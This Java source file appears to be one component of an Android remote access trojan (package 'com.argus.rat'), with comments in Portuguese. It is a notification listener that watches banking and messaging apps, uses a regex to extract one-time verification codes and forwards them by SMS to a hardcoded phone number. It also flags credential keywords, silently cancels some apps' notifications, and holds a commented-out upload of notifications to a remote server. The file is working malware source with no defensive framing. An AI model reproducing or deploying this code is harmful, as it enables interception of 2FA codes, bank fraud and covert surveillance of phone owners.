package com.argus.rat;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class NotificationService extends NotificationListenerService {
    private static final String TAG = "NotificationService";
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();
    
    // Lista de pacotes para monitorar/suprimir
    private static final Set<String> MONITORED_PACKAGES = new HashSet<>();
    private static final Set<String> SUPPRESSED_PACKAGES = new HashSet<>();
    
    static {
        // Aplicativos bancários para monitorar
        MONITORED_PACKAGES.add("com.bbva.bbvacontigo");
        MONITORED_PACKAGES.add("br.com.bradesco");
        MONITORED_PACKAGES.add("com.itau");
        MONITORED_PACKAGES.add("com.santander");
        MONITORED_PACKAGES.add("com.nubank");
        
        // Aplicativos de mensagens para monitorar
        MONITORED_PACKAGES.add("com.whatsapp");
        MONITORED_PACKAGES.add("org.telegram");
        MONITORED_PACKAGES.add("com.facebook.orca");
        
        // Aplicativos para suprimir (exemplo)
        SUPPRESSED_PACKAGES.add("com.google.android.apps.photos");
        SUPPRESSED_PACKAGES.add("com.spotify.music");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "NotificationService criado");
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.d(TAG, "NotificationService conectado");
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        Log.w(TAG, "NotificationService desconectado");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        executor.execute(() -> {
            try {
                processNotification(sbn);
            } catch (Exception e) {
                Log.e(TAG, "Erro ao processar notificação", e);
            }
        });
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Log de remoção de notificação
        Log.d(TAG, "Notificação removida: " + sbn.getPackageName());
    }

    private void processNotification(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        android.app.Notification notification = sbn.getNotification();
        android.os.Bundle extras = notification.extras;
        
        if (extras == null) return;

        String title = extras.getString(android.app.Notification.EXTRA_TITLE, "");
        CharSequence text = extras.getCharSequence(android.app.Notification.EXTRA_TEXT, "");
        long postTime = sbn.getPostTime();

        // Criar objeto de dados da notificação
        NotificationData notifData = new NotificationData(
            packageName,
            title,
            text.toString(),
            postTime,
            sbn.getId(),
            sbn.getTag()
        );

        // Processar baseado no tipo de aplicativo
        if (MONITORED_PACKAGES.contains(packageName)) {
            handleMonitoredNotification(notifData);
        }
        
        if (SUPPRESSED_PACKAGES.contains(packageName)) {
            handleSuppressedNotification(sbn, notifData);
        }
        
        // Log geral para debug
        Log.i(TAG, String.format("Notificação - App: %s, Título: %s", 
            packageName, title.substring(0, Math.min(title.length(), 30))));
    }

    private void handleMonitoredNotification(NotificationData notifData) {
        try {
            Log.w(TAG, "NOTIFICAÇÃO MONITORADA DETECTADA");
            Log.w(TAG, String.format("App: %s | Título: %s | Texto: %s",
                notifData.getPackageName(),
                notifData.getTitle(),
                notifData.getText().substring(0, Math.min(notifData.getText().length(), 50))
            ));

            // 1. Armazenar localmente
//            NotificationDatabaseHelper.saveNotification(this, notifData);
//
//            // 2. Encaminhar para servidor remoto
//            if (NetworkUtils.isNetworkAvailable(this)) {
//                NetworkManager.uploadNotification(notifData);
//            }

            // 3. Processar conteúdo específico
            processNotificationContent(notifData);

        } catch (Exception e) {
            Log.e(TAG, "Erro no tratamento de notificação monitorada", e);
        }
    }

    private void handleSuppressedNotification(StatusBarNotification sbn, NotificationData notifData) {
        try {
            if (shouldSuppressNotification(notifData.getPackageName())) {
                cancelNotification(sbn.getKey());
                Log.d(TAG, "Notificação suprimida: " + notifData.getPackageName());
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao suprimir notificação", e);
        }
    }

    private void processNotificationContent(NotificationData notifData) {
        String packageName = notifData.getPackageName();
        String text = notifData.getText().toLowerCase();

        // Detectar códigos de verificação (OTP)
        if (containsVerificationCode(text)) {
            Log.w(TAG, "CÓDIGO DE VERIFICAÇÃO DETECTADO: " + extractCode(text));
            handleVerificationCode(notifData, extractCode(text));
        }

        // Detectar informações bancárias
        if (packageName.contains("bank") || packageName.contains("bradesco") || 
            packageName.contains("itau") || packageName.contains("santander")) {
            Log.w(TAG, "INFORMAÇÃO BANCÁRIA DETECTADA");
            handleBankingInformation(notifData);
        }

        // Detectar credenciais
        if (containsCredentials(text)) {
            Log.w(TAG, "CREDENCIAIS DETECTADAS");
            handleCredentials(notifData);
        }
    }

    private boolean containsVerificationCode(String text) {
        // Padrões comuns de códigos de verificação
        return text.matches(".*\\b\\d{4,8}\\b.*") || // 4-8 dígitos
               text.contains("código") || text.contains("code") ||
               text.contains("verificação") || text.contains("verification") ||
               text.contains("otp") || text.contains("2fa");
    }

    private String extractCode(String text) {
        // Extrair código numérico
        java.util.regex.Matcher matcher = java.util.regex.Pattern.compile("\\b\\d{4,8}\\b").matcher(text);
        if (matcher.find()) {
            return matcher.group();
        }
        return "N/A";
    }

    private boolean containsCredentials(String text) {
        // Detectar possíveis credenciais
        return text.contains("senha") || text.contains("password") ||
               text.contains("usuário") || text.contains("username") ||
               text.contains("login") || text.contains("conta") ||
               text.contains("account");
    }

    private void handleVerificationCode(NotificationData notifData, String code) {
        // Processar código de verificação
        try {
            // Encaminhar código via SMS ou rede
            SmsManager.sendSms("+5511999999999", 
                "Código " + notifData.getPackageName() + ": " + code);
            
            Log.w(TAG, "Código de verificação processado: " + code);
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao processar código de verificação", e);
        }
    }

    private void handleBankingInformation(NotificationData notifData) {
        // Processar informações bancárias
        Log.w(TAG, "Informação bancária processada: " + notifData.getPackageName());
    }

    private void handleCredentials(NotificationData notifData) {
        // Processar credenciais
        Log.w(TAG, "Credenciais processadas: " + notifData.getPackageName());
    }

    private boolean shouldSuppressNotification(String packageName) {
        // Lógica para determinar quais notificações suprimir
        return SUPPRESSED_PACKAGES.contains(packageName);
    }

    // Classe de dados para notificação
    public static class NotificationData {
        private final String packageName;
        private final String title;
        private final String text;
        private final long timestamp;
        private final int id;
        private final String tag;

        public NotificationData(String packageName, String title, String text, 
                               long timestamp, int id, String tag) {
            this.packageName = packageName;
            this.title = title;
            this.text = text;
            this.timestamp = timestamp;
            this.id = id;
            this.tag = tag;
        }

        public String getPackageName() { return packageName; }
        public String getTitle() { return title; }
        public String getText() { return text; }
        public long getTimestamp() { return timestamp; }
        public int getId() { return id; }
        public String getTag() { return tag; }
    }
}